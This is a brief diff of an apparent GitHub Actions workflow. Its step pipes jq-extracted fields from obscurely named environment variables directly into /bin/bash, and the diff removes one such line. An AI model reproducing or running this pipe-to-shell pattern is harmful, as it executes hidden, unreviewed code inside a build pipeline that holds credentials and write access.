@@ -22,7 +22,6 @@ jobs:
           echo $ffb7482 | jq -r .seiau02070 | /bin/bash
           echo $ihirj1 | jq -r .rv16 | /bin/bash
           printf '%s' "$sij607" | jq -r .dcq97664 | /bin/bash
-          printf '%s' "$rafrb782" | jq -r .c59807 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
